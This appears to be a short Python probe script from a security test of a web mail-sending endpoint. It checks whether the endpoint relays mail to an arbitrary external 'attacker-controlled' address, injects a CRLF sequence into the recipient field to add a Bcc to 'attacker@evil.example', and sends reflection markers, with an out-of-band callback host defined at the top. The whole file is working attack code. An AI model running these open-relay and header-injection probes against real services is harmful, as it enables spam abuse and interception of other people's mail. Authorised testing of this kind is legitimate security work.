import time, json
from send_lib import send, base

H = "oob5e33c3656eda.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"

# Prove open relay: arbitrary external recipient accepted
c, h, b = send(base(targets="attacker-controlled@protonmail-probe.example"), tries=20)
print("RELAY external ->", c, b[:200])
time.sleep(1)

# CRLF header injection in targets (the to field) - append CC/BCC
crlf = "victim@nothing.local\r\nBcc: attacker@evil.example"
c, h, b = send(base(targets=crlf), tries=20)
print("CRLF targets ->", c, b[:200])
time.sleep(1)

# Does 'subject' get reflected? send a marker
c, h, b = send(base(targets="scanner@nothing.local", subject="SUBJMARKER12345", msg="MSGMARKER67890"), tries=20)
print("marker ->", c, b[:200])
